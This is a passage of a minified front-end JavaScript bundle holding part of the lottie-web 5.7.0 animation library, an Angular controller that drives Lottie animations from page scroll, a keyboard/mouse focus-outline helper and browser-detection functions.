1===t?l:r(t-1)}var s,o,a=t.d?t.d.length:0,l={};for(s=0;s<a;s+=1)o=s,Object.defineProperty(l,t.d[o].nm,{get:ExpressionPropertyInterface(e.d.dataProps[o].p)}),e.d.dataProps[s].p.setGroupProperty(n);function h(t){return"Color"===t||"color"===t?h.color:"Opacity"===t||"opacity"===t?h.opacity:"Stroke Width"===t||"stroke width"===t?h.strokeWidth:void 0}return Object.defineProperties(h,{color:{get:ExpressionPropertyInterface(e.c)},opacity:{get:ExpressionPropertyInterface(e.o)},strokeWidth:{get:ExpressionPropertyInterface(e.w)},dash:{get:function(){return l}},_name:{value:t.nm},mn:{value:t.mn}}),e.c.setGroupProperty(r),e.o.setGroupProperty(r),e.w.setGroupProperty(r),h}function n(t,e,i){function r(t){return 1==t?n:i(--t)}function n(e){return e===t.e.ix||"End"===e||"end"===e?n.end:e===t.s.ix?n.start:e===t.o.ix?n.offset:void 0}return n.propertyIndex=t.ix,e.s.setGroupProperty(r),e.e.setGroupProperty(r),e.o.setGroupProperty(r),n.propertyIndex=t.ix,n.propertyGroup=i,Object.defineProperties(n,{start:{get:ExpressionPropertyInterface(e.s)},end:{get:ExpressionPropertyInterface(e.e)},offset:{get:ExpressionPropertyInterface(e.o)},_name:{value:t.nm}}),n.mn=t.mn,n}function s(t,e,i){function r(t){return 1==t?s:i(--t)}s.propertyIndex=t.ix;var n="tm"===e.sh.ty?e.sh.prop:e.sh;function s(e){return t.p.ix===e?s.position:t.s.ix===e?s.size:void 0}return n.s.setGroupProperty(r),n.p.setGroupProperty(r),Object.defineProperties(s,{size:{get:ExpressionPropertyInterface(n.s)},position:{get:ExpressionPropertyInterface(n.p)},_name:{value:t.nm}}),s.mn=t.mn,s}function o(t,e,i){function r(t){return 1==t?s:i(--t)}var n="tm"===e.sh.ty?e.sh.prop:e.sh;function s(e){return t.p.ix===e?s.position:t.r.ix===e?s.rotation:t.pt.ix===e?s.points:t.or.ix===e||"ADBE Vector Star Outer Radius"===e?s.outerRadius:t.os.ix===e?s.outerRoundness:!t.ir||t.ir.ix!==e&&"ADBE Vector Star Inner Radius"!==e?t.is&&t.is.ix===e?s.innerRoundness:void 0:s.innerRadius}return s.propertyIndex=t.ix,n.or.setGroupProperty(r),n.os.setGroupProperty(r),n.pt.setGroupProperty(r),n.p.setGroupProperty(r),n.r.setGroupProperty(r),t.ir&&(n.ir.setGroupProperty(r),n.is.setGroupProperty(r)),Object.defineProperties(s,{position:{get:ExpressionPropertyInterface(n.p)},rotation:{get:ExpressionPropertyInterface(n.r)},points:{get:ExpressionPropertyInterface(n.pt)},outerRadius:{get:ExpressionPropertyInterface(n.or)},outerRoundness:{get:ExpressionPropertyInterface(n.os)},innerRadius:{get:ExpressionPropertyInterface(n.ir)},innerRoundness:{get:ExpressionPropertyInterface(n.is)},_name:{value:t.nm}}),s.mn=t.mn,s}function a(t,e,i){function r(t){return 1==t?s:i(--t)}var n="tm"===e.sh.ty?e.sh.prop:e.sh;function s(e){return t.p.ix===e?s.position:t.r.ix===e?s.roundness:t.s.ix===e||"Size"===e||"ADBE Vector Rect Size"===e?s.size:void 0}return s.propertyIndex=t.ix,n.p.setGroupProperty(r),n.s.setGroupProperty(r),n.r.setGroupProperty(r),Object.defineProperties(s,{position:{get:ExpressionPropertyInterface(n.p)},roundness:{get:ExpressionPropertyInterface(n.r)},size:{get:ExpressionPropertyInterface(n.s)},_name:{value:t.nm}}),s.mn=t.mn,s}function l(t,e,i){var r=e;function n(e){if(t.r.ix===e||"Round Corners 1"===e)return n.radius}return n.propertyIndex=t.ix,r.rd.setGroupProperty((function(t){return 1==t?n:i(--t)})),Object.defineProperties(n,{radius:{get:ExpressionPropertyInterface(r.rd)},_name:{value:t.nm}}),n.mn=t.mn,n}function h(t,e,i){function r(t){return 1==t?s:i(--t)}var n=e;function s(e){return t.c.ix===e||"Copies"===e?s.copies:t.o.ix===e||"Offset"===e?s.offset:void 0}return s.propertyIndex=t.ix,n.c.setGroupProperty(r),n.o.setGroupProperty(r),Object.defineProperties(s,{copies:{get:ExpressionPropertyInterface(n.c)},offset:{get:ExpressionPropertyInterface(n.o)},_name:{value:t.nm}}),s.mn=t.mn,s}function c(t,e,i){var r=e.sh;function n(t){if("Shape"===t||"shape"===t||"Path"===t||"path"===t||"ADBE Vector Shape"===t||2===t)return n.path}return r.setGroupProperty((function(t){return 1==t?n:i(--t)})),Object.defineProperties(n,{path:{get:function(){return r.k&&r.getValue(),r}},shape:{get:function(){return r.k&&r.getValue(),r}},_name:{value:t.nm},ix:{value:t.ix},propertyIndex:{value:t.ix},mn:{value:t.mn}}),n}return function(e,i,r){var n;function s(t){if("number"==typeof t)return n[t-1];for(var e=0,i=n.length;e<i;){if(n[e]._name===t)return n[e];e+=1}}return s.propertyGroup=r,n=t(e,i,s),s.numProperties=n.length,s}}(),TextExpressionInterface=function(t){var e,i;function r(){}return Object.defineProperty(r,"sourceText",{get:function(){t.textProperty.getValue();var r=t.textProperty.currentData.t;return r!==e&&(t.textProperty.currentData.t=e,(i=new String(r)).value=r||new String(r)),i}}),r},LayerExpressionInterface=function(){function t(t,e){var i=new Matrix;if(i.reset(),this._elem.finalTransform.mProp.applyToMatrix(i),this._elem.hierarchy&&this._elem.hierarchy.length){var r,n=this._elem.hierarchy.length;for(r=0;r<n;r+=1)this._elem.hierarchy[r].finalTransform.mProp.applyToMatrix(i);return i.applyToPointArray(t[0],t[1],t[2]||0)}return i.applyToPointArray(t[0],t[1],t[2]||0)}function e(t,e){var i=new Matrix;if(i.reset(),this._elem.finalTransform.mProp.applyToMatrix(i),this._elem.hierarchy&&this._elem.hierarchy.length){var r,n=this._elem.hierarchy.length;for(r=0;r<n;r+=1)this._elem.hierarchy[r].finalTransform.mProp.applyToMatrix(i);return i.inversePoint(t)}return i.inversePoint(t)}function i(t){var e=new Matrix;if(e.reset(),this._elem.finalTransform.mProp.applyToMatrix(e),this._elem.hierarchy&&this._elem.hierarchy.length){var i,r=this._elem.hierarchy.length;for(i=0;i<r;i+=1)this._elem.hierarchy[i].finalTransform.mProp.applyToMatrix(e);return e.inversePoint(t)}return e.inversePoint(t)}function r(){return[1,1,1,1]}return function(n){var s;function o(t){switch(t){case"ADBE Root Vectors Group":case"Contents":case 2:return o.shapeInterface;case 1:case 6:case"Transform":case"transform":case"ADBE Transform Group":return s;case 4:case"ADBE Effect Parade":case"effects":case"Effects":return o.effect}}o.toWorld=t,o.fromWorld=e,o.toComp=t,o.fromComp=i,o.sampleImage=r,o.sourceRectAtTime=n.sourceRectAtTime.bind(n),o._elem=n;var a=getDescriptor(s=TransformExpressionInterface(n.finalTransform.mProp),"anchorPoint");return Object.defineProperties(o,{hasParent:{get:function(){return n.hierarchy.length}},parent:{get:function(){return n.hierarchy[0].layerInterface}},rotation:getDescriptor(s,"rotation"),scale:getDescriptor(s,"scale"),position:getDescriptor(s,"position"),opacity:getDescriptor(s,"opacity"),anchorPoint:a,anchor_point:a,transform:{get:function(){return s}},active:{get:function(){return n.isInRange}}}),o.startTime=n.data.st,o.index=n.data.ind,o.source=n.data.refId,o.height=0===n.data.ty?n.data.h:100,o.width=0===n.data.ty?n.data.w:100,o.inPoint=n.data.ip/n.comp.globalData.frameRate,o.outPoint=n.data.op/n.comp.globalData.frameRate,o._name=n.data.nm,o.registerMaskInterface=function(t){o.mask=new MaskManagerInterface(t,n)},o.registerEffectsInterface=function(t){o.effect=t},o}}(),CompExpressionInterface=function(t){function e(e){for(var i=0,r=t.layers.length;i<r;){if(t.layers[i].nm===e||t.layers[i].ind===e)return t.elements[i].layerInterface;i+=1}return null}return Object.defineProperty(e,"_name",{value:t.data.nm}),e.layer=e,e.pixelAspect=1,e.height=t.data.h||t.globalData.compSize.h,e.width=t.data.w||t.globalData.compSize.w,e.pixelAspect=1,e.frameDuration=1/t.globalData.frameRate,e.displayStartTime=0,e.numLayers=t.layers.length,e},TransformExpressionInterface=function(t){function e(t){switch(t){case"scale":case"Scale":case"ADBE Scale":case 6:return e.scale;case"rotation":case"Rotation":case"ADBE Rotation":case"ADBE Rotate Z":case 10:return e.rotation;case"ADBE Rotate X":return e.xRotation;case"ADBE Rotate Y":return e.yRotation;case"position":case"Position":case"ADBE Position":case 2:return e.position;case"ADBE Position_0":return e.xPosition;case"ADBE Position_1":return e.yPosition;case"ADBE Position_2":return e.zPosition;case"anchorPoint":case"AnchorPoint":case"Anchor Point":case"ADBE AnchorPoint":case 1:return e.anchorPoint;case"opacity":case"Opacity":case 11:return e.opacity}}if(Object.defineProperty(e,"rotation",{get:ExpressionPropertyInterface(t.r||t.rz)}),Object.defineProperty(e,"zRotation",{get:ExpressionPropertyInterface(t.rz||t.r)}),Object.defineProperty(e,"xRotation",{get:ExpressionPropertyInterface(t.rx)}),Object.defineProperty(e,"yRotation",{get:ExpressionPropertyInterface(t.ry)}),Object.defineProperty(e,"scale",{get:ExpressionPropertyInterface(t.s)}),t.p)var i=ExpressionPropertyInterface(t.p);return Object.defineProperty(e,"position",{get:function(){return t.p?i():[t.px.v,t.py.v,t.pz?t.pz.v:0]}}),Object.defineProperty(e,"xPosition",{get:ExpressionPropertyInterface(t.px)}),Object.defineProperty(e,"yPosition",{get:ExpressionPropertyInterface(t.py)}),Object.defineProperty(e,"zPosition",{get:ExpressionPropertyInterface(t.pz)}),Object.defineProperty(e,"anchorPoint",{get:ExpressionPropertyInterface(t.a)}),Object.defineProperty(e,"opacity",{get:ExpressionPropertyInterface(t.o)}),Object.defineProperty(e,"skew",{get:ExpressionPropertyInterface(t.sk)}),Object.defineProperty(e,"skewAxis",{get:ExpressionPropertyInterface(t.sa)}),Object.defineProperty(e,"orientation",{get:ExpressionPropertyInterface(t.or)}),e},ProjectInterface=function(){function t(t){this.compositions.push(t)}return function(){function e(t){for(var e=0,i=this.compositions.length;e<i;){if(this.compositions[e].data&&this.compositions[e].data.nm===t)return this.compositions[e].prepareFrame&&this.compositions[e].data.xt&&this.compositions[e].prepareFrame(this.currentFrame),this.compositions[e].compInterface;e+=1}}return e.compositions=[],e.currentFrame=0,e.registerComposition=t,e}}(),EffectsExpressionInterface=function(){function t(i,r,n,s){var o,a=[],l=i.ef.length;for(o=0;o<l;o+=1)5===i.ef[o].ty?a.push(t(i.ef[o],r.effectElements[o],r.effectElements[o].propertyGroup,s)):a.push(e(r.effectElements[o],i.ef[o].ty,s,h));function h(t){return 1===t?c:n(t-1)}var c=function(t){for(var e=i.ef,r=0,n=e.length;r<n;){if(t===e[r].nm||t===e[r].mn||t===e[r].ix)return 5===e[r].ty?a[r]:a[r]();r+=1}return a[0]()};return c.propertyGroup=h,"ADBE Color Control"===i.mn&&Object.defineProperty(c,"color",{get:function(){return a[0]()}}),Object.defineProperty(c,"numProperties",{get:function(){return i.np}}),c.active=c.enabled=0!==i.en,c}function e(t,e,i,r){var n=ExpressionPropertyInterface(t.p);return t.p.setGroupProperty&&t.p.setGroupProperty(r),function(){return 10===e?i.comp.compInterface(t.p.v):n()}}return{createEffectsInterface:function(e,i){if(e.effectsManager){var r,n=[],s=e.data.ef,o=e.effectsManager.effectElements.length;for(r=0;r<o;r+=1)n.push(t(s[r],e.effectsManager.effectElements[r],i,e));return function(t){for(var i=e.data.ef||[],r=0,s=i.length;r<s;){if(t===i[r].nm||t===i[r].mn||t===i[r].ix)return n[r];r+=1}}}}}}(),MaskManagerInterface=function(){function t(t,e){this._mask=t,this._data=e}return Object.defineProperty(t.prototype,"maskPath",{get:function(){return this._mask.prop.k&&this._mask.prop.getValue(),this._mask.prop}}),Object.defineProperty(t.prototype,"maskOpacity",{get:function(){return this._mask.op.k&&this._mask.op.getValue(),100*this._mask.op.v}}),function(e,i){var r,n=createSizedArray(e.viewData.length),s=e.viewData.length;for(r=0;r<s;r+=1)n[r]=new t(e.viewData[r],e.masksProperties[r]);return function(t){for(r=0;r<s;){if(e.masksProperties[r].nm===t)return n[r];r+=1}}}}(),ExpressionPropertyInterface=function(){var t={pv:0,v:0,mult:1},e={pv:[0,0,0],v:[0,0,0],mult:1};function i(t,e,i){Object.defineProperty(t,"velocity",{get:function(){return e.getVelocityAtTime(e.comp.currentFrame)}}),t.numKeys=e.keyframes?e.keyframes.length:0,t.key=function(r){if(t.numKeys){var n="";n="s"in e.keyframes[r-1]?e.keyframes[r-1].s:"e"in e.keyframes[r-2]?e.keyframes[r-2].e:e.keyframes[r-2].s;var s="unidimensional"===i?new Number(n):Object.assign({},n);return s.time=e.keyframes[r-1].t/e.elem.comp.globalData.frameRate,s}return 0},t.valueAtTime=e.getValueAtTime,t.speedAtTime=e.getSpeedAtTime,t.velocityAtTime=e.getVelocityAtTime,t.propertyGroup=e.propertyGroup}function r(){return t}return function(n){return n?"unidimensional"===n.propType?function(e){(!e||!("pv"in e))&&(e=t);var r=1/e.mult,n=e.pv*r,s=new Number(n);return s.value=n,i(s,e,"unidimensional"),function(){return e.k&&e.getValue(),n=e.v*r,s.value!==n&&((s=new Number(n)).value=n,i(s,e,"unidimensional")),s}}(n):function(t){(!t||!("pv"in t))&&(t=e);var r=1/t.mult,n=t.pv.length,s=createTypedArray("float32",n),o=createTypedArray("float32",n);return s.value=o,i(s,t,"multidimensional"),function(){t.k&&t.getValue();for(var e=0;e<n;e+=1)s[e]=o[e]=t.v[e]*r;return s}}(n):r}}();function SliderEffect(t,e,i){this.p=PropertyFactory.getProp(e,t.v,0,0,i)}function AngleEffect(t,e,i){this.p=PropertyFactory.getProp(e,t.v,0,0,i)}function ColorEffect(t,e,i){this.p=PropertyFactory.getProp(e,t.v,1,0,i)}function PointEffect(t,e,i){this.p=PropertyFactory.getProp(e,t.v,1,0,i)}function LayerIndexEffect(t,e,i){this.p=PropertyFactory.getProp(e,t.v,0,0,i)}function MaskIndexEffect(t,e,i){this.p=PropertyFactory.getProp(e,t.v,0,0,i)}function CheckboxEffect(t,e,i){this.p=PropertyFactory.getProp(e,t.v,0,0,i)}function NoValueEffect(){this.p={}}function EffectsManager(){}function EffectsManager(t,e){var i=t.ef||[];this.effectElements=[];var r,n,s=i.length;for(r=0;r<s;r++)n=new GroupEffect(i[r],e),this.effectElements.push(n)}function GroupEffect(t,e){this.init(t,e)}!function(){var t=function(){function t(t,e){return this.textIndex=t+1,this.textTotal=e,this.v=this.getValue()*this.mult,this.v}return function(e,i){this.pv=1,this.comp=e.comp,this.elem=e,this.mult=.01,this.propType="textSelector",this.textTotal=i.totalChars,this.selectorValue=100,this.lastValue=[1,1,1],this.k=!0,this.x=!0,this.getValue=ExpressionManager.initiateExpression.bind(this)(e,i,this),this.getMult=t,this.getVelocityAtTime=expressionHelpers.getVelocityAtTime,this.kf?this.getValueAtTime=expressionHelpers.getValueAtTime.bind(this):this.getValueAtTime=expressionHelpers.getStaticValueAtTime.bind(this),this.setGroupProperty=expressionHelpers.setGroupProperty}}(),e=TextSelectorProp.getTextSelectorProp;TextSelectorProp.getTextSelectorProp=function(i,r,n){return 1===r.t?new t(i,r,n):e(i,r,n)}}(),extendPrototype([DynamicPropertyContainer],GroupEffect),GroupEffect.prototype.getValue=GroupEffect.prototype.iterateDynamicProperties,GroupEffect.prototype.init=function(t,e){this.data=t,this.effectElements=[],this.initDynamicPropertyContainer(e);var i,r,n=this.data.ef.length,s=this.data.ef;for(i=0;i<n;i+=1){switch(r=null,s[i].ty){case 0:r=new SliderEffect(s[i],e,this);break;case 1:r=new AngleEffect(s[i],e,this);break;case 2:r=new ColorEffect(s[i],e,this);break;case 3:r=new PointEffect(s[i],e,this);break;case 4:case 7:r=new CheckboxEffect(s[i],e,this);break;case 10:r=new LayerIndexEffect(s[i],e,this);break;case 11:r=new MaskIndexEffect(s[i],e,this);break;case 5:r=new EffectsManager(s[i],e,this);break;default:r=new NoValueEffect(s[i],e,this)}r&&this.effectElements.push(r)}};var lottie={},_isFrozen=!1;function setLocationHref(t){locationHref=t}function searchAnimations(){!0===standalone?animationManager.searchAnimations(animationData,standalone,renderer):animationManager.searchAnimations()}function setSubframeRendering(t){subframeEnabled=t}function loadAnimation(t){return!0===standalone&&(t.animationData=JSON.parse(animationData)),animationManager.loadAnimation(t)}function setQuality(t){if("string"==typeof t)switch(t){case"high":defaultCurveSegments=200;break;case"medium":defaultCurveSegments=50;break;case"low":defaultCurveSegments=10}else!isNaN(t)&&t>1&&(defaultCurveSegments=t);roundValues(!(defaultCurveSegments>=50))}function inBrowser(){return"undefined"!=typeof navigator}function installPlugin(t,e){"expressions"===t&&(expressionsPlugin=e)}function getFactory(t){switch(t){case"propertyFactory":return PropertyFactory;case"shapePropertyFactory":return ShapePropertyFactory;case"matrix":return Matrix}}function checkReady(){"complete"===document.readyState&&(clearInterval(readyStateCheckInterval),searchAnimations())}function getQueryVariable(t){for(var e=queryString.split("&"),i=0;i<e.length;i++){var r=e[i].split("=");if(decodeURIComponent(r[0])==t)return decodeURIComponent(r[1])}}lottie.play=animationManager.play,lottie.pause=animationManager.pause,lottie.setLocationHref=setLocationHref,lottie.togglePause=animationManager.togglePause,lottie.setSpeed=animationManager.setSpeed,lottie.setDirection=animationManager.setDirection,lottie.stop=animationManager.stop,lottie.searchAnimations=searchAnimations,lottie.registerAnimation=animationManager.registerAnimation,lottie.loadAnimation=loadAnimation,lottie.setSubframeRendering=setSubframeRendering,lottie.resize=animationManager.resize,lottie.goToAndStop=animationManager.goToAndStop,lottie.destroy=animationManager.destroy,lottie.setQuality=setQuality,lottie.inBrowser=inBrowser,lottie.installPlugin=installPlugin,lottie.freeze=animationManager.freeze,lottie.unfreeze=animationManager.unfreeze,lottie.getRegisteredAnimations=animationManager.getRegisteredAnimations,lottie.__getFactory=getFactory,lottie.version="5.7.0";var standalone="__[STANDALONE]__",animationData="__[ANIMATIONDATA]__",renderer="";if(standalone){var scripts=document.getElementsByTagName("script"),index=scripts.length-1,myScript=scripts[index]||{src:""},queryString=myScript.src.replace(/^[^\?]+\??/,"");renderer=getQueryVariable("renderer")}var readyStateCheckInterval=setInterval(checkReady,100);return lottie},"function"==typeof define&&define.amd?define((function(){return e(t)})):"object"==typeof module&&module.exports?module.exports=e(t):(t.lottie=e(t),t.bodymovin=t.lottie))})),Gn=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=class{constructor(t,e,i,r){this.x2=t,this.y2=e,this.x3=t,this.y3=r}static getBezierPoint(t,e,i,r,n,s,o,a,l){let h=1-t;return{x:t*t*t*a+3*t*t*h*s+3*t*h*h*r+h*h*h*e,y:t*t*t*l+3*t*t*h*o+3*t*h*h*n+h*h*h*i}}static getPoint(t,i,r,n,s){return e.getBezierPoint(t,i.x,i.y,r.x,r.y,n.x,n.y,s.x,s.y)}static interpolateProgress(t,i,r,n,s){return e.getBezierPoint(t,0,0,i,r,n,s,1,1).y}interpolate(t){return e.interpolateProgress(t,this.x2,this.y2,this.x3,this.y3)}easingFunction(){return t=>this.interpolate(t)}static makeEasingFunction(t,e,i,r){return n=>this.interpolateProgress(n,t,e,i,r)}};t.CubicBezier=e})),C0=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=Fa(),i=hf(),r=Nt(),n=fs(),s=di(),o=pn(),a=Js(),l=Ki(),h=Kl(),c=Zr(),u=Gn();t.LottieScrollEvents={INIT:"INIT",PROGRESS_UPDATE:"LOTTIE_SCROLL_EVENT"};var d=class{constructor(t,e,n){this.lottieObjects=[],this.currentProgress=0,this.element=t[0],this.scrollEl=this.element,this.domWatcher=new r.DomWatcher,this.domWatcher.add({element:window,on:"scroll",callback:this.onWindowScroll.bind(this),eventOptions:{passive:!0}}),this.domWatcher.add({element:window,on:"resize",callback:this.onWindowResize.bind(this),eventOptions:{passive:!0}}),this.rafProgress=new i.RafProgress(this.progressUpdate.bind(this)),this.rafProgress.setPrecision(5),this.domWatcher.add({element:document,on:"yano-lottie-scroll-update",callback:this.handleLottieScrollUpdateEvent.bind(this),eventOptions:{passive:!0}}),this.domWatcher.add({element:this.element,on:"yano-lottie-scroll-update",callback:this.handleLottieScrollUpdateEvent.bind(this),eventOptions:{passive:!0}});let s=JSON.parse(this.element.getAttribute("lottie-scroll")),o=s.settings||{};this.lottieScrollSettings=Object.assign({debug:!1,lerp:1,damp:1,top:"0px",bottom:"0px"},o),s.lotties&&(s.lotties.forEach((t=>{let e=Object.assign({debugFrame:!1,json_path:null,json_path_webp:null,image_path:null,image_path_webp:null,container_selector:null,renderer:"canvas",preserveAspectRatio:"xMidYMid slice",startFrame:0,intro:null,introCompleted:!1,fromProgress:null,toProgress:null,classTriggers:null,activeTriggerClasses:[],autoplay:null,endFrame:0,lottieInDom:!1},t);this.lottieObjects.push(e)})),this.createLottieInstances()),e.$on("$destroy",(()=>{this.dispose()}))}static get $inject(){return["$element","$scope","$attrs"]}getPixelValue(t){let e=a.cssUnit.parse(t),i=1;return"%"==e.unit?(i=this.element.offsetHeight,i*(e.value/100)):"vh"==e.unit?(i=window.innerHeight,i*(e.value/100)):i*e.value}onWindowResize(){this.calculateProgressOffsets(),this.lottieObjects.map(((t,e)=>{let i=this.element.querySelector(t.container_selector);return t.isOnScreen=!n.dom.isDisplayNoneWithAncestors(i),t}));let t=this.currentProgress;0==t?this.progressUpdate(t+.01,0):this.progressUpdate(Math.max(0,t-.01),0),this.resizeLottie(),this.progressUpdate(t,0)}resizeLottie(){this.lottieObjects.forEach((t=>{t.lottieInDom&&t.lottieInstance.resize()}))}calculateProgressOffsets(){this.progressTopOffset=o.func.setDefault(this.getPixelValue(this.lottieScrollSettings.top),0),this.progressBottomOffset=o.func.setDefault(this.getPixelValue(this.lottieScrollSettings.bottom),0)}createLottieInstances(){this.lottieObjects.forEach(((i,r)=>{c.is.supportingWebpAsync().then((o=>{let a=i.json_path_webp&&o?i.json_path_webp:i.json_path,h={container:this.element.querySelector(i.container_selector),loop:!0,autoplay:!1,renderer:i.renderer,rendererSettings:{preserveAspectRatio:i.preserveAspectRatio},path:a};i.image_path&&(o&&i.image_path_webp?h.assetsPath=i.image_path_webp:h.assetsPath=i.image_path);let d=e.loadAnimation(h);d.setSubframe(!1),this.lottieObjects[r].lottieInstance=d,d.addEventListener("DOMLoaded",(()=>{if(0==this.lottieObjects[r].endFrame&&(this.lottieObjects[r].endFrame=d.totalFrames),this.lottieObjects[r].classTriggers){let t=this.lottieObjects[r].startFrame,e=this.lottieObjects[r].endFrame;this.lottieObjects[r].classTriggers.map((i=>{if(c.is.defined(i.fromFrame)&&(i.from=s.mathf.inverseLerp(t,e,i.fromFrame,!0)),c.is.defined(i.toFrame)){let r=i.toFrame;String(r).startsWith("+")&&(r=i.fromFrame+ +String(r).replace("+","")),i.to=s.mathf.inverseLerp(t,e,+r,!0)}}))}this.lottieObjects[r].interpolations?(this.lottieObjects[r].interpolations.map((t=>{let e=this.lottieObjects[r].startFrame,i=this.lottieObjects[r].endFrame;return t.progress.map((t=>{if(c.is.defined(t.fromFrame)&&(t.from=s.mathf.inverseLerp(e,i,t.fromFrame,!0)),c.is.defined(t.toFrame)){let r=t.toFrame;String(r).startsWith("+")&&(r=t.fromFrame+ +String(r).replace("+","")),t.to=s.mathf.inverseLerp(e,i,r,!0)}if(c.is.defined(t.cubic_ease)){let e=t.cubic_ease.split(",");t.easingFunction=u.CubicBezier.makeEasingFunction(e[0],e[1],e[2],e[3])}return t})),t})),this.lottieObjects[r].cssInterpolatorInstance=new l.CssVarInterpolate(this.element,{interpolations:this.lottieObjects[r].interpolations}),this.lottieObjects[r].cssInterpolatorInstance.useBatchUpdate(!0),this.lottieObjects[r].lottieInDom=!0,this.onWindowResize(),this.lottieObjects[r].intro&&this.playIntro(this.lottieObjects[r]),window.setTimeout((()=>{this.element.classList.add("lottie-scroll-loaded")}))):this.onWindowResize();let e={controller:this};n.dom.event(this.element,t.LottieScrollEvents.INIT,e),this.updateImmediately()}),{once:!0})}))}))}onWindowScroll(){this.rafProgress.dampTo(this.getPercent(),this.lottieScrollSettings.lerp,this.lottieScrollSettings.damp)}playIntro(t){if(this.getPercent()>0)return void(t.introCompleted=!0);let e=new h.RafTimer((e=>{let i=this.getPercent(),r=s.mathf.lerp(t.startFrame,t.endFrame,i);!c.is.null(t.fromProgress)&&!c.is.null(t.toProgress)&&(e=s.mathf.childProgress(e,t.fromProgress,t.toProgress));let n=s.mathf.lerp(t.intro.startFrame,r,e);t.lottieInstance.goToAndStop(n,!0);let o=s.mathf.inverseLerp(t.startFrame,t.endFrame,n,!0);t.cssInterpolatorInstance&&t.cssInterpolatorInstance.update(o)}));e.setDuration(t.intro.duration||300),e.onComplete((()=>{t.introCompleted=!0,e.dispose()})),e.play()}drawOrLoop(t,e){let i=this.rafProgress.getScrollDirection();t.autoplay&&!t.isAutoPlaying&&(t.autoplay.down&&1==i||t.autoplay.up&&-1==i)&&s.mathf.isBetween(this.currentProgress,t.fromProgress,t.toProgress,!0)?(t.isAutoPlaying=!0,t.autoplay.loopStartFrame?t.lottieInstance.playSegments([[t.autoplay.fromFrame,t.autoplay.toFrame],[t.autoplay.loopStartFrame,t.autoplay.loopEndFrame]],!0):(t.lottieInstance.loop=!1,t.lottieInstance.goToAndStop(t.autoplay.fromFrame,!0),t.lottieInstance.playSegments([[t.autoplay.fromFrame,t.autoplay.toFrame]],!0))):t.autoplay?s.mathf.isBetween(this.currentProgress,t.fromProgress,t.toProgress,!0)||(t.isAutoPlaying=!1,t.lottieInstance.goToAndStop(1e5,!0)):(t.isAutoPlaying=!1,t.lottieInstance.goToAndStop(e,!0))}progressUpdate(e,i){this.lottieScrollSettings.debug&&console.log(this.currentProgress);let r={controller:this,progress:e,direction:i};n.dom.event(this.element,t.LottieScrollEvents.PROGRESS_UPDATE,r),this.currentProgress=e,this.lottieObjects.forEach((t=>{let i=e;if(!t.intro||t.introCompleted){if(!t.isOnScreen)return void(t.debugFrame&&console.log("lottie is not on screen"));if(t.lottieInstance&&t.lottieInstance.isLoaded){!c.is.null(t.fromProgress)&&!c.is.null(t.toProgress)&&(i=s.mathf.childProgress(i,t.fromProgress,t.toProgress));let r=s.mathf.lerp(t.startFrame,t.endFrame,i);t.debugFrame&&console.log("Frame",r,e,window.scrollY),this.drawOrLoop(t,r)}}})),this.lottieObjects.forEach((t=>{t.intro&&!t.introCompleted||!t.isOnScreen||t.cssInterpolatorInstance&&t.cssInterpolatorInstance.update(e)})),this.updateClassTriggers(e)}updateClassTriggers(t){this.lottieObjects.forEach((e=>{if(!e.isOnScreen)return;let i=[],r=[];e.classTriggers&&e.classTriggers.forEach((e=>{s.mathf.isBetween(t,+e.from,+e.to,!0)?i.push(e.class):r.push(e.class)})),i.forEach((t=>{e.activeTriggerClasses.includes(t)||this.element.classList.add(t)})),r.forEach((t=>{e.activeTriggerClasses.includes(t)&&this.element.classList.remove(t)})),e.activeTriggerClasses=i}))}updateImmediately(){let t=this.getPercent();this.rafProgress.setCurrentProgress(t),this.lottieObjects.forEach((e=>{let i=e.intro&&!e.introCompleted;!e.isOnScreen||i||e.cssInterpolatorInstance&&e.cssInterpolatorInstance.update(t)}))}getPercent(){return n.dom.getElementScrolledPercent(this.scrollEl,this.progressTopOffset,this.progressBottomOffset)}getScrollYAtPercent(t){return n.dom.getScrollYAtPercent(this.scrollEl,this.progressTopOffset,this.progressBottomOffset,t)}getLottieObjects(){return this.lottieObjects}handleLottieScrollUpdateEvent(t){let e=t.detail;e.lerp&&(this.lottieScrollSettings.lerp=+e.lerp),e.damp&&(this.lottieScrollSettings.damp=+e.damp)}dispose(){this.lottieObjects.forEach((t=>{t.lottieInstance.destroy(),t.cssInterpolatorInstance=null})),this.domWatcher.dispose(),this.rafProgress.dispose()}};t.LottieController=d,t.lottieScrollDirective=function(){return{restrict:"A",controller:d}}})),x0=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e,i,r=pn();(i=e||(e={})).MOUSE="mouse",i.KEYBOARD="keyboard";t.AccessibleOutline=class{constructor(t){this.element=t,this.listenerDisposers=[],this.setCurrentInput=r.func.runOnceOnChange(this.setCurrentInput.bind(this)),this.addEvents("mousemove",this.setMouse.bind(this)),this.addEvents("mousedown",this.setMouse.bind(this)),this.addEvents("mouseup",this.setMouse.bind(this)),this.addEvents("touchmove",this.setMouse.bind(this)),this.addEvents("touchstart",this.setMouse.bind(this)),this.addEvents("touchend",this.setMouse.bind(this)),this.addEvents("keyup",this.setKeyboard.bind(this)),this.addEvents("keydown",this.setKeyboard.bind(this))}setKeyboard(){this.setCurrentInput(e.KEYBOARD)}setMouse(){this.setCurrentInput(e.MOUSE)}addEvents(t,e){document.addEventListener(t,e),this.listenerDisposers.push((()=>{document.removeEventListener(t,e)}))}setCurrentInput(t){this.element.setAttribute("data-current-input",t)}dispose(){this.listenerDisposers.forEach((t=>{t()}))}}})),Fd=st(((t,e)=>{function i(){return/iPhone|iPad|iPod/i.test(navigator.userAgent)||r()}function r(){return-1!==navigator.userAgent.toLowerCase().indexOf("macintosh")&&navigator.maxTouchPoints&&navigator.maxTouchPoints>2}function n(){return/Android/i.test(navigator.userAgent)}function s(){return-1!=navigator.userAgent.indexOf("Chrome")&&!o()}function o(){return-1!=navigator.userAgent.indexOf("Edge")}e.exports={isAndroid:n,isChrome:s,isEdge:o,isFirefox:function(){return-1!=navigator.userAgent.indexOf("Firefox")},isIOS:i,isIPad:r,isIE:function(){return/MSIE\/\d+/.test(navigator.userAgent)},isIEorEdge:function(){return/Edge\/\d+/.test(navigator.userAgent)||/MSIE\/\d+/.test(navigator.userAgent)||/Trident\/\d+/.test(navigator.userAgent)},isMobile:function(){return i()||n()},isSafari:function(){return!s()&&-1!=navigator.userAgent.indexOf("Safari")}}})),Rw=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var 